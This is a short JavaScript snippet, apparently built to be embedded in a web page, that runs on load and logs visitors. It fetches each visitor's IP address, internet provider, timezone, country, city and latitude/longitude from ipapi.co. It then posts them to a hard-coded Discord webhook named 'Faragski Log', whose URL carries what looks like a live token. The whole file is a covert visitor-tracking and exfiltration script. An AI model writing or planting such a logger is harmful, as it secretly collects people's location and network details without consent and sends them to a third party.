var webHookUrl = "https://discord.com/api/webhooks/1211802871050281011/LTJ-f5cYHfxQ8X5Uy4Wq9erRLaFl7DiNPs_VEysLpgRoLvQo9sGYnQC25rL22PJzruEy?hf-ignore";

const request = async () => { // Calling a "synchronous" fetch
    const response = await fetch('https://ipapi.co/json');
    const data = await response.json();

    // Declaring variables
    var ip = data.ip;

    var provider = data.org;

    var timezone = data.timezone;
    var country = data.country_name;
    var countryCode = data.country_code.toLowerCase();
    var region = data.region;
    var city = data.city;

    var lat = data.latitude;
    var lon = data.longitude;

    // Open POST Request
    var postRequest = new XMLHttpRequest();
    postRequest.open("POST", webHookUrl);

    postRequest.setRequestHeader('Content-type', 'application/json');

    var params = {
        username:   "Faragski Log",
        avatar_url: "",
        embeds:    [{ title: ":clapper: New Visit",
                    color: "14119907",
                    description: "__**:globe_with_meridians: IP-Address:**__ \n" 
                    + "`" + ip + "`" + 
                    "\n \n__**:telephone: Provider:**__ \n" 
                    + provider + 
                    "\n \n__**:map: Timezone:**__ \n" 
                    + timezone + 
                    "\n \n__**:flag_" + countryCode + ": Country and Region:**__ \n" 
                    + country + " - " + region + 
                    "\n \n__**:cityscape: City:**__ \n" 
                    + city +
                    "\n \n__**:round_pushpin: Location:**__ \n" 
                    + "**Longitude:** " + lon + "\n"
                    + "**Latitude:** " + lat
                   }]
    }

    postRequest.send(JSON.stringify(params));

}

request();
